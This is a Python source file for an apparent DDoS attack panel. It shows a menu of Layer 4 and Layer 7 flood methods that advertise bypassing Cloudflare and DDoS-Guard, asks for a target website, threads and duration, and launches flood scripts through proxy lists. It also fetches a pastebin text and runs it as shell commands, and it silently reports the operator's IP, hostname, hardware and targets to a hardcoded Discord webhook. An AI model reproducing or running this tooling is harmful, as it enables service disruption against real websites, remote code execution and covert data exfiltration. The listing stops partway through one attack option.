# -*- coding: utf-8 -*-
# usr/env/bin/python3.6
import colorama
import sys
import os
import getpass
from datetime import date
import requests as r
import json
import socket
import platform
import psutil
from discord_logger import DiscordLogger
from discord_webhook import DiscordWebhook, DiscordEmbed
import speedtest
import datetime
import time
s = speedtest.Speedtest()


time_now = datetime.datetime.now().strftime("%H:%M:%S")
downspeed = round((round(s.download()) / 1048576), 2)
upspeed = round((round(s.upload()) / 1048576), 2)
speedtestbaba = (f"Download speed: \n{downspeed} Mb/s\nUpload speed:\n{upspeed} Mb/s")



machine = platform.machine()
systemos = platform.system()

pyshicalcores = psutil.cpu_count(logical=False)
logicalcores = psutil.cpu_count(logical=True)

totalram = f"{round(psutil.virtual_memory().total/1000000000, 2)} GB"
avaliableram = f"{round(psutil.virtual_memory().available/1000000000, 2)} GB"
usedram = f"{round(psutil.virtual_memory().used/1000000000, 2)} GB"
ramusagepercent = f"{psutil.virtual_memory().percent}%"


hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)


os.system('clear')
version = "7 \033[31mDark\033[96mness \033[31mMini"
pcnaam = "z3ntl3"
indicatorlogo = f"\033[0m\033[36m┌──\033[36m(\033[31m@\033[0m\033[31mroot\033[36m)-[\033[0m\033[39m\033[1m/home/z3ntl3\033[0m\033[36m]\n\033[36m└───\033[31m\033[1m⮞\033[0m\033[96m "
systeemnaam = getpass.getuser()
today = date.today()
d2 = today.strftime("%B %d, %Y")

developer = f"""
       \033[36m╔══════════════════════════════╗\033[0m
       \033[36m║\033[39m  Anti-Cursed \033[31mDarkness \033[39mSquad  \033[36m║\033[0m
       \033[36m║   \033[31m>  \033[39mSoftware Developer:  \033[31m<  \033[36m║\033[0m
       \033[36m║          \033[31mz3ntl3 \033[96mroot\033[36m         ║\033[0m
       \033[36m║           \033[96memp\033[31m\033[1mfaked \033[36m\033[0m          \033[36m║\033[0m
       \033[36m╚══════════════════════════════╝\033[0m


\033[31m> \033[96mVersion:\033[39m {version}"""
space = "    "
logov = f"""
{space}\033[36m    ╔═╗╔╗╔╔╦╗╦       \033[36m╔═╗╦ ╦╦═╗╔═╗╔═╗╔╦╗
{space}\033[36m    ╠═╣║║║ ║ ║  \033[31m───  \033[36m║  ║ ║╠╦╝╚═╗║╣  ║║
{space}\033[36m    ╩ ╩╝╚╝ ╩ ╩       \033[36m╚═╝╚═╝╩╚═╚═╝╚═╝═╩╝\033[0m
{space}\033[31m╔╦╗╔═╗╦═╗╦╔═\033[39m╔╗╔╔═╗╔═╗╔═╗  \033[96m╔═╗╔═╗ ╦ ╦╔═╗╔╦╗
{space}\033[31m ║║╠═╣╠╦╝╠╩╗\033[39m║║║║╣ ╚═╗╚═╗  \033[96m╚═╗║═╬╗║ ║╠═╣ ║║
{space}\033[31m═╩╝╩ ╩╩╚═╩ ╩\033[39m╝╚╝╚═╝╚═╝╚═╝  \033[96m╚═╝╚═╝╚╚═╝╩ ╩═╩╝
                  \033[31mTodays Date:\033[0m
                  {d2}
{developer}

"""
logo = f"""
{space}\033[36m    ╔═╗╔╗╔╔╦╗╦       \033[36m╔═╗╦ ╦╦═╗╔═╗╔═╗╔╦╗
{space}\033[36m    ╠═╣║║║ ║ ║  \033[31m───  \033[36m║  ║ ║╠╦╝╚═╗║╣  ║║
{space}\033[36m    ╩ ╩╝╚╝ ╩ ╩       \033[36m╚═╝╚═╝╩╚═╚═╝╚═╝═╩╝\033[0m
{space}\033[31m╔╦╗╔═╗╦═╗╦╔═\033[39m╔╗╔╔═╗╔═╗╔═╗  \033[96m╔═╗╔═╗ ╦ ╦╔═╗╔╦╗
{space}\033[31m ║║╠═╣╠╦╝╠╩╗\033[39m║║║║╣ ╚═╗╚═╗  \033[96m╚═╗║═╬╗║ ║╠═╣ ║║
{space}\033[31m═╩╝╩ ╩╩╚═╩ ╩\033[39m╝╚╝╚═╝╚═╝╚═╝  \033[96m╚═╝╚═╝╚╚═╝╩ ╩═╩╝
                        \033[31mTodays Date:\033[0m
                       {d2}
{developer}

"""
developerx = f"""
       \033[36m╔══════════════════════════════╗\033[0m
       \033[36m║\033[39m  Anti-Cursed \033[31mDarkness \033[39mSquad  \033[36m║\033[0m
       \033[36m║   \033[31m>  \033[39mSoftware Developer:  \033[31m<  \033[36m║\033[0m
       \033[36m║          \033[31mz3ntl3 \033[96mroot\033[36m         ║\033[0m
       \033[36m║           \033[96memp\033[31m\033[1mfaked \033[36m\033[0m          \033[36m║\033[0m
       \033[36m╚══════════════════════════════╝\033[0m

\033[31m> \033[96mVersion:\033[39m {version}"""
logoblocked = f"""
{space}\033[36m    ╔═╗╔╗╔╔╦╗╦       \033[36m╔═╗╦ ╦╦═╗╔═╗╔═╗╔╦╗
{space}\033[36m    ╠═╣║║║ ║ ║  \033[31m───  \033[36m║  ║ ║╠╦╝╚═╗║╣  ║║
{space}\033[36m    ╩ ╩╝╚╝ ╩ ╩       \033[36m╚═╝╚═╝╩╚═╚═╝╚═╝═╩╝\033[0m
{space}\033[31m╔╦╗╔═╗╦═╗╦╔═\033[39m╔╗╔╔═╗╔═╗╔═╗  \033[96m╔═╗╔═╗ ╦ ╦╔═╗╔╦╗
{space}\033[31m ║║╠═╣╠╦╝╠╩╗\033[39m║║║║╣ ╚═╗╚═╗  \033[96m╚═╗║═╬╗║ ║╠═╣ ║║
{space}\033[31m═╩╝╩ ╩╩╚═╩ ╩\033[39m╝╚╝╚═╝╚═╝╚═╝  \033[96m╚═╝╚═╝╚╚═╝╩ ╩═╩╝
                        \033[31mTodays Date:\033[0m
                       {d2}
{developerx}

"""
def logdiscord():
    try:
        api = r.get("http://ip-api.com/json/")
        apijson = json.loads(api.text)
        blocknetworkIPS = apijson['query']

        bypassVPN = r.get(f"http://ip-api.com/json/{blocknetworkIPS}")
        apijsonroot = json.loads(bypassVPN.text)

        bypassROOTED = apijsonroot['query']
        country = apijsonroot['country']
        webhook_url = "https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU"
        options = {
        "application_name": "Scorpion-Hackz.com | API",
        "service_name": "Backend API",
        "service_icon_url": "https://media.tenor.com/images/e35b47b0d497cf46989512d0015fa8dc/tenor.gif",
        "service_environment": "Block banned networks.",
        "default_level": "info",
}

        logger = DiscordLogger(webhook_url=webhook_url, **options)
        logger.construct(
        title="Backend Network API",
        description="Successfully protected the panel against Turkish Networks",
        level="success",
        metadata={
        "Blocked Network:": {
            f"Bypassed IP": {bypassROOTED},
            f"Host": {hostname}
        },
        "Blocked": "Yes",
    },
)   
        
        response = logger.send()
    except KeyboardInterrupt:
            print('Keyboard Interruption')
            load()
            license()
            menu()
    except EOFError:
            print('EOF Error')
            load()
            license()
            menu()  
    except FileExistsError:
        print("File Exist")
        os.system('sudo rm -r proxies.txt')
        load()
        license()
        menu()
def blocknetworks():
    try:
        while True:
            print(logov)
            api = r.get("http://ip-api.com/json/")
            apijson = json.loads(api.text)
            blocknetworkIPS = apijson['query']

            bypassVPN = r.get(f"http://ip-api.com/json/{blocknetworkIPS}")
            apijsonroot = json.loads(bypassVPN.text)
            blocknetworkBYPASS = apijson['country']
            if blocknetworkBYPASS == "Turkey":
                print(f'{indicatorlogo}\033[31mTurkish \033[0m\033[36mVPS \033[1m&\033[0m \033[96mNetworks \033[31m\033[1mBlocked\033[0m\n')
                logdiscord()
                sys.exit()
                

            else:
                break
            
    except KeyboardInterrupt:
        print('Keyboard Interruption')
        load()
        license()
        menu()
    except EOFError:
        print('EOF Error')
        load()
        license()
        menu()  
    except FileExistsError:
        print("File Exist")
        os.system('sudo rm -r proxies.txt')
        load()
        license()
        menu()

blocknetworks()


def update():
    try:
        os.system('sudo rm -r darkness')
        paste = r.get("https://pastebin.com/raw/2PJF0fqe")
        pastetext = (paste.text)
        os.system(f'{pastetext}')
        os.system('clear')
        os.system('sudo ./darkness')
    except KeyboardInterrupt:
            print('Keyboard Interruption')
            load()
            license()
            menu()
    except EOFError:
            print('EOF Error')
            load()
            license()
            menu()



def modding():
    try:
        os.system('chmod +x haven')
        os.system('chmod +x fixer')
        os.system('ulimit -n 999999')
    except KeyboardInterrupt:
        print("Keyboard Interrupt")
        load()
        license()
        menu()
    except EOFError:
        print('EOF Error')
        load()
        license()
        menu()
modding()
os.system('clear')
def proxies():
    try:
        os.system('sudo rm -r proxies.txt')
        crawlPROXYHTTP = r.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=7000")
        textPROXIES = (crawlPROXYHTTP.text)
        with open('proxies.txt', 'x') as file:
            file.write(str(textPROXIES))
            file.write('\n')
    except KeyboardInterrupt:
        print("Keyboard Interrupt")
        load()
        license()
        menu()
    except EOFError:
        print('EOF Error')
        load()
        license()
        menu()
    except FileExistsError:
        print("File Exist")
        os.system('sudo rm -r proxies.txt')
        load()
        license()
        menu()
proxies()
def load():
    try:
        

        os.system('clear')
        version = "7 \033[31mDark\033[96mness \033[31mMini"
        pcnaam = "z3ntl3"
        indicatorlogo = f"\033[0m\033[36m┌──\033[36m(\033[31m@\033[0m\033[31mroot\033[36m)-[\033[0m\033[39m\033[1m/home/z3ntl3\033[0m\033[36m]\n\033[36m└───\033[31m\033[1m⮞\033[0m\033[96m "
        systeemnaam = getpass.getuser()
        today = date.today()
        d2 = today.strftime("%B %d, %Y")
        developer = f"""
       \033[36m╔══════════════════════════════╗\033[0m
       \033[36m║\033[39m  Anti-Cursed \033[31mDarkness \033[39mSquad  \033[36m║\033[0m
       \033[36m║   \033[31m>  \033[39mSoftware Developer:  \033[31m<  \033[36m║\033[0m
       \033[36m║          \033[31mz3ntl3 \033[96mroot\033[36m         ║\033[0m
       \033[36m║           \033[96memp\033[31m\033[1mfaked \033[36m\033[0m          \033[36m║\033[0m
       \033[36m╚══════════════════════════════╝\033[0m

\033[31m> \033[96mVersion:\033[39m {version}"""

        space = "    "



        logo = f"""
{space}\033[36m    ╔═╗╔╗╔╔╦╗╦       \033[36m╔═╗╦ ╦╦═╗╔═╗╔═╗╔╦╗
{space}\033[36m    ╠═╣║║║ ║ ║  \033[31m───  \033[36m║  ║ ║╠╦╝╚═╗║╣  ║║
{space}\033[36m    ╩ ╩╝╚╝ ╩ ╩       \033[36m╚═╝╚═╝╩╚═╚═╝╚═╝═╩╝\033[0m
{space}\033[31m╔╦╗╔═╗╦═╗╦╔═\033[39m╔╗╔╔═╗╔═╗╔═╗  \033[96m╔═╗╔═╗ ╦ ╦╔═╗╔╦╗
{space}\033[31m ║║╠═╣╠╦╝╠╩╗\033[39m║║║║╣ ╚═╗╚═╗  \033[96m╚═╗║═╬╗║ ║╠═╣ ║║
{space}\033[31m═╩╝╩ ╩╩╚═╩ ╩\033[39m╝╚╝╚═╝╚═╝╚═╝  \033[96m╚═╝╚═╝╚╚═╝╩ ╩═╩╝
                  \033[31mTodays Date:\033[0m
                  {d2}
{developer}


\033[1m\033[31m⮞ \033[31mMethod \033[0m\033[31mDev\033[96m'\033[31ms\033[96m:\033[0m
\033[96m\033[1mMhProDev \033[0m\033[31m, \033[96mGoogleAdmin
\033[96mEmpFaked \033[31m\033[1m, \033[96mwachirachoomsiri\033[0m \033[31m\033[1m& \033[0m\033[96mR00tS3c\033[0m  

"""
        logoexpired = f"""
{space}\033[36m    ╔═╗╔╗╔╔╦╗╦       \033[36m╔═╗╦ ╦╦═╗╔═╗╔═╗╔╦╗
{space}\033[36m    ╠═╣║║║ ║ ║  \033[31m───  \033[36m║  ║ ║╠╦╝╚═╗║╣  ║║
{space}\033[36m    ╩ ╩╝╚╝ ╩ ╩       \033[36m╚═╝╚═╝╩╚═╚═╝╚═╝═╩╝\033[0m
{space}\033[31m╔╦╗╔═╗╦═╗╦╔═\033[39m╔╗╔╔═╗╔═╗╔═╗  \033[96m╔═╗╔═╗ ╦ ╦╔═╗╔╦╗
{space}\033[31m ║║╠═╣╠╦╝╠╩╗\033[39m║║║║╣ ╚═╗╚═╗  \033[96m╚═╗║═╬╗║ ║╠═╣ ║║
{space}\033[31m═╩╝╩ ╩╩╚═╩ ╩\033[39m╝╚╝╚═╝╚═╝╚═╝  \033[96m╚═╝╚═╝╚╚═╝╩ ╩═╩╝
                        \033[31mTodays Date:\033[0m
                       {d2}
{developer}

\033[31m>>>\033[36m Your License is Expired or INVALID or Wrong PASSWORD

"""

        logo2 = f"""
{space}\033[36m    ╔═╗╔╗╔╔╦╗╦       \033[36m╔═╗╦ ╦╦═╗╔═╗╔═╗╔╦╗
{space}\033[36m    ╠═╣║║║ ║ ║  \033[31m───  \033[36m║  ║ ║╠╦╝╚═╗║╣  ║║
{space}\033[36m    ╩ ╩╝╚╝ ╩ ╩       \033[36m╚═╝╚═╝╩╚═╚═╝╚═╝═╩╝\033[0m
{space}\033[31m╔╦╗╔═╗╦═╗╦╔═\033[39m╔╗╔╔═╗╔═╗╔═╗  \033[96m╔═╗╔═╗ ╦ ╦╔═╗╔╦╗
{space}\033[31m ║║╠═╣╠╦╝╠╩╗\033[39m║║║║╣ ╚═╗╚═╗  \033[96m╚═╗║═╬╗║ ║╠═╣ ║║
{space}\033[31m═╩╝╩ ╩╩╚═╩ ╩\033[39m╝╚╝╚═╝╚═╝╚═╝  \033[96m╚═╝╚═╝╚╚═╝╩ ╩═╩╝
                        \033[31mTodays Date:\033[0m
                       {d2}
{developer}

\033[31m>>> \033[39m Logged in.
\033[31m>>> \033[39m CTRL + Z to STOP"""

        print(logo)
    except KeyboardInterrupt:
        print("Keyboard Interrupt")
        load()
        license()
        menu()
    except EOFError:
        print('EOF Error')
        load()
        license()
        menu()
    except FileExistsError:
        print("File Exist")
        os.system('sudo rm -r proxies.txt')
        load()
        license()
        menu()

load()


def wrongoption():
    try:
        os.system('clear')
        version = "7"
        pcnaam = "z3ntl3"
        indicatorlogo = f"\033[0m\033[36m┌──\033[36m(\033[31m@\033[0m\033[31mroot\033[36m)-[\033[0m\033[39m\033[1m/home/z3ntl3\033[0m\033[36m]\n\033[36m└───\033[31m\033[1m⮞\033[0m\033[96m "
        systeemnaam = getpass.getuser()
        today = date.today()
        d2 = today.strftime("%B %d, %Y")
        developer = f"""
              \033[36m╔══════════════════════════════╗\033[0m
              \033[36m║\033[39m  Anti-Cursed \033[31mDarkness \033[39mSquad  \033[36m║\033[0m
              \033[36m║   \033[31m>  \033[39mSoftware Developer:  \033[31m<  \033[36m║\033[0m
              \033[36m║                              ║\033[0m
              \033[36m║      \033[31mz3ntl3 \033[31mroot \033[96m(\033[31mEfdal\033[96m)\033[36m     ║\033[0m
              \033[36m╚══════════════════════════════╝\033[0m

\033[31m> \033[96mVersion:\033[39m {version}

\033[31m>\033[96mMethod developers:\033[39m 
\033[32m\033[1m# \033[0mMhProDev
\033[32m\033[1m# \033[0mR00tS3c
\033[32m\033[1m# \033[0mwachirachoomsiri
\033[32m\033[1m# \033[0mGoogleAdmin
\033[32m\033[1m# \033[0memp001

{indicatorlogo} WRONG OPTION"""
        print(str(developer))
        load()
        license()
        menu()
    except KeyboardInterrupt:
        print("Keyboard Interrupt")
        load()
        license()
        menu()
    except EOFError:
        print('EOF Error')
        load()
        license()
        menu()
    except FileExistsError:
        print("File Exist")
        os.system('sudo rm -r proxies.txt')
        load()
        license()
        menu()    

def tip():
    try:
        print(
        "\033[1m\033[31m> \033[0m\033[96mAttack Started\033[31m CTRL + C to go back Menu")
    except KeyboardInterrupt:
        print("Keyboard Interrupt")
        load()
        license()
        menu()
    except EOFError:
        print('EOF Error')
        load()
        license()
        menu()
    except FileExistsError:
        print("File Exist")
        os.system('sudo rm -r proxies.txt')
        load()
        license()
        menu()
# lisans sistemi
def license():
    try:
        while True:
            licensiesystem = (r.get("https://pastebin.com/raw/ME8Y6Vjw").text)
            if licensiesystem == "valid":
                print(f"\033[0m\033[36m┌──\033[36m(\033[31m@root\033[0m\033[31m\033[36m)-[\033[0m\033[39m\033[1m/home/z3ntl3\033[0m\033[36m]\n\033[36m└───\033[31m⮞\033[42m\033[0m\033[96m License: Valid \033[31m[\033[32m\033[1mOnline\033[0m\033[31m] \033[31m+ \033[96mProxies Updated\033[31m!")
                break
            else:
                print(f"\033[0m\033[36m┌──\033[36m(\033[@root\033[0m\033[\033[36m)-[\033[0m\033[39m\033[1m/home/z3ntl3\033[0m\033[36m]\n\033[36m└───\033[31m⮞\033[42m\033[0m\033[96m License: \033[31m[\033[96m\033[1mOffline\033[0m\033[31m]")
                sys.exit()
    except KeyboardInterrupt:
            print('Keyboard Interruption')
            load()
            license()
            menu()
    except EOFError:
            print('EOF Error')
            load()
            license()
            menu()


license()
def methods():
    try:
        print("""\033[31m[\033[96mTools\033[31m]\033[0m
\033[31m⮞ \033[96mfixer 
\033[31m⮞ \033[96mupdate
\033[31m⮞ \033[96mproxy-crawl

\033[31m[\033[96mLayer 4\033[31m]\033[0m
\033[31m⮞ \033[96mhaven-god

\033[31m[\033[96mLayer7\033[31m]\033[0m
\033[31m⮞ \033[96mmh-null
\033[31m⮞ \033[96mmh-get
\033[31m⮞ \033[96mmh-post
\033[31m⮞ \033[96mmh-dyn
\033[31m⮞ \033[96mmh-even
\033[31m⮞ \033[96mmh-ddosguard
\033[31m⮞ \033[96mmh-arvancloud
\033[31m⮞ \033[96mmh-normalbypass
\033[31m⮞ \033[96mmh-projectshield
\033[31m⮞ \033[96mmh-cfbypass
\033[31m⮞ \033[96multra-bypass
\033[31m⮞ \033[96mnuker-proxyless
\033[31m⮞ \033[96mnuker-proxied
\033[31m⮞ \033[96mhttp-raw

\033[31m\033[1m⮞ \033[0m\033[96mback
""")
    except KeyboardInterrupt:
            print('Keyboard Interruption')
            load()
            license()
            menu()
    except EOFError:
            print('EOF Error')
            load()
            license()
            menu()

def menu():
    print('\n\033[31m\033[1m> \033[96m Type \033[31mmenu \033[96m to view \033[31mattack\033[96m commands\033[31m!\033[96m')
    try:
        kies = input('\n' + indicatorlogo)
    except KeyboardInterrupt:
            print('Keyboard Interruption')
            load()
            license()
            menu()
    except EOFError:
            print('EOF Error')
            load()
            license()
            menu()
    try:
        while True:

            if kies == "menu":
                os.system('clear')
                print(logov)
                methods()
                menuoption = input("\n" + indicatorlogo)
                if menuoption == "exit":
                    sys.exit()
                
                if menuoption == "back":
                    load()
                    license()
                    menu()
                if menuoption == "fixer":
                    os.system('./fixer')
                    
                if menuoption == "update":
                    update()
                if menuoption == "proxy-crawl":
                    os.system('clear')
                    load()
                    print("""
\033[36m[\033[39mTOOLS.x\033[36m]\033[0m

\033[31m> \033[39mproxy-crawl \033[31m: \033[36m crawl proxies\033[31m[\033[32mRUNNING\033[31m]\033[0m
    """)
                    os.system('sudo rm -r proxies.txt')
                    crawlPROXYHTTP = r.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=7000")
                    textPROXIES = (crawlPROXYHTTP.text)
                    with open('proxies.txt', 'x') as file:
                        file.write(str(textPROXIES))
                        file.write('\n')
                        print(indicatorlogo + "Proxies saved in = proxies.txt\n\n")
                        gobackMENU = input(indicatorlogo + "Go back to menu (y/n):")
                        if gobackMENU == "n":
                            sys.exit()
                        else:
                            load()
                            license()
                            menu()
                if menuoption == "mh-normalbypass":
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-normalbypass \033[31m: \033[36m Powerfull Layer 7 Attack: Bypass normal anti ddos \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                    mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                    mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                    mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                    mhgetsend = ('python3 start.py bypass ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                    tip()
                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_timestamp()


                    embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
                    embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                    embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                    embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                    embed.add_embed_field(name='Method:', value='mh-normalbypass')
                    embed.add_embed_field(name='Machine:', value=f'{machine}')
                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhook.add_embed(embed)
                    response = webhook.execute()
                    os.system(mhgetsend)
                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_timestamp()


                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
                    embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                    embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                    embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                    embedx.add_embed_field(name='Method:', value='mh-normalbypass')
                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhookx.add_embed(embedx)
                    responsex = webhookx.execute()
                    load()
                    license()
                    menu()
                if menuoption == "mh-cfbypass":
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-cfbypass \033[31m: \033[36m Powerfull Layer 7 Attack: Bypass CLOUDFLARE \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                    mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                    mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                    mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                    mhgetsend = ('python3 start.py cfb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                    tip()
                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_timestamp()


                    embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
                    embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                    embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                    embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                    embed.add_embed_field(name='Method:', value='mh-cfbypass')
                    embed.add_embed_field(name='Machine:', value=f'{machine}')
                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhook.add_embed(embed)
                    response = webhook.execute()
                    os.system(mhgetsend)
                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_timestamp()


                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
                    embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                    embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                    embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                    embedx.add_embed_field(name='Method:', value='mh-cfbypass')
                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhookx.add_embed(embedx)
                    responsex = webhookx.execute()
                    load()
                    license()
                    menu()
                if menuoption == "mh-ddosguard":
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-ddosguard \033[31m: \033[36m Powerfull Layer 7 Attack: Bypass DDOS GUARD \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                    mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                    mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                    mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                    mhgetsend = ('python3 start.py dgb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                    tip()
